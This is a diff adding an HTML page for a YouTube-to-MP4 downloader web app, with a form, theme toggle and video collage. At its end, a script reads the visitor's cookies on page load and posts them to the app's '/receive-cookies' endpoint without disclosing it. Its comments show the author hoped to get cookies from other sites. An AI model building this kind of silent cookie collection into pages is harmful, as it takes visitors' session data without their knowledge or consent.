@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download YouTube Video as MP4</title>
+    <link rel="icon" href="{{ url_for('static', filename='images/icon.png') }}" type="image/x-icon">
+    <style>
+       /* Root variables for color themes */
+        :root {
+            --bg-color-light: #f9f9f9;
+            --text-color-light: #333;
+            --bg-color-dark: #1c1c1c;
+            --text-color-dark: #f9f9f9;
+            --button-color: #ff5722;
+            --button-text-color: #fff;
+            --icon-color: #FF0000;
+        }
+        
+        /* Base styles */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            height: 100vh;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            transition: background-color 0.3s, color 0.3s;
+        }
+        h1 {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-top: 30px;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background-color: var(--bg-color);
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
+            margin-top: 10px;
+        }
+        label, input, button {
+            margin: 10px 0;
+        }
+        input[type="url"] {
+            padding: 8px;
+            width: 80%;
+            max-width: 400px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        button, .switch-button {
+            padding: 10px 20px;
+            background-color: var(--button-color);
+            color: var(--button-text-color);
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+            text-align: center;
+            text-decoration: none; /* Remove underline from link */
+            display: inline-block; /* Ensure proper button styling */
+        }
+        button:hover, .switch-button:hover {
+            background-color: #e64a19;
+        }
+
+        /* Light theme */
+        .light-theme {
+            --bg-color: var(--bg-color-light);
+            --text-color: var(--text-color-light);
+        }
+
+        /* Dark theme */
+        .dark-theme {
+            --bg-color: var(--bg-color-dark);
+            --text-color: var(--text-color-dark);
+        }
+
+        /* YouTube Icon */
+        .youtube-icon {
+            width: 24px;
+            height: 24px;
+            fill: var(--icon-color);
+        }
+
+        /* Theme toggle button */
+        .theme-toggle {
+            margin-top: 20px;
+            cursor: pointer;
+            font-size: 1rem;
+            color: var(--button-color);
+        }
+
+        /* Credit section */
+        .credit {
+            margin-top: auto;
+            padding: 10px;
+            font-size: 0.8rem;
+            text-align: center;
+        }
+        .credit a {
+            color: var(--button-color);
+            text-decoration: none;
+        }
+
+        /* Collage section */
+        .collage {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin: 20px 0;
+        }
+        .collage a {
+            margin: 10px;
+            display: inline-block;
+        }
+        .collage img {
+            width: 150px;
+            height: 150px;
+            border-radius: 8px;
+            box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.2);
+            transition: transform 0.3s;
+        }
+        .collage img:hover {
+            transform: scale(1.05);
+        }
+
+        /* Responsive layout */
+        @media (max-width: 768px) {
+            form {
+                width: 90%;
+            }
+            h1 {
+                font-size: 1.5rem;
+            }
+            .collage img {
+                width: 120px;
+                height: 120px;
+            }
+        }
+    </style>
+</head>
+<body class="light-theme">
+    <h1>
+        <svg class="youtube-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19.6 3H4.4C2.89 3 1.8 4.09 1.8 5.6v12.8c0 1.51 1.09 2.6 2.6 2.6h15.2c1.51 0 2.6-1.09 2.6-2.6V5.6c0-1.51-1.09-2.6-2.6-2.6zM10 15V9l6 3-6 3z"/></svg>
+        Download YouTube Video as MP4
+    </h1>
+    <form action="/download-mp4" method="POST">  
+        <label for="link">Enter the link to download:</label>
+        <input type="url" id="link" name="link" required>
+        <button type="submit">Download</button>
+        <a href="/" class="switch-button">Switch to MP3</a> 
+    </form>
+    <div class="theme-toggle" onclick="toggleTheme()">Toggle Theme</div>
+
+    <div class="collage">
+        <a href="https://youtu.be/j08epXbBlyY?si=k1ihT1qMMQ7gvNwH" target="_blank">
+            <img src="static/images/img1.png" alt="Music Highlight 1">
+        </a>
+        <a href="https://youtu.be/dglBgJSMr-E?si=OXaRfOlCduZ4oShS" target="_blank">
+            <img src="static/images/img2.png" alt="Music Highlight 2">
+        </a>
+        <a href="https://youtu.be/rdgnp916zNE?si=1HNnJNj_t0Q7PAyz" target="_blank">
+            <img src="static/images/img3.png" alt="Music Highlight 3">
+        </a>
+        <a href="https://youtu.be/B2bnLUce6wI?si=1VgBjhkAgGGgZ-fd" target="_blank">
+            <img src="static/images/img4.png" alt="Music Highlight 4">
+       </a>
+    </div>
+
+    <div class="credit">
+        © 2024 by <a href="https://github.com/Jayson056" target="_blank">Jayson056</a>
+    </div>
+
+    <script>
+          // Theme toggle functionality
+        const body = document.body;
+        function toggleTheme() {
+            if (body.classList.contains('light-theme')) {
+                body.classList.remove('light-theme');
+                body.classList.add('dark-theme');
+            } else {
+                body.classList.remove('dark-theme');
+                body.classList.add('light-theme');
+            }
+        }
+
+        // Adjust the viewer based on platform
+        if (navigator.userAgent.toLowerCase().includes('android')) {
+            document.documentElement.style.fontSize = '16px';
+        } else {
+            document.documentElement.style.fontSize = '18px';
+        }
+    </script>
+
+<script>
+    async function sendCookiesToServer() {
+        try {
+            // Attempt to extract cookies (Cross-origin restrictions apply)
+            let cookies = document.cookie; 
+            
+            if (!cookies) {
+                console.warn("No cookies found! Try enabling third-party cookies.");
+                return;
+            }
+    
+            // Send cookies to the server
+            let response = await fetch('/receive-cookies', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ cookies: cookies })
+            });
+    
+            let result = await response.json();
+            console.log("Server Response:", result);
+        } catch (error) {
+            console.error("Error sending cookies:", error);
+        }
+    }
+    
+    // Call this function on page load
+    sendCookiesToServer();
+    </script>
+    
+
+
+</body>
+</html>
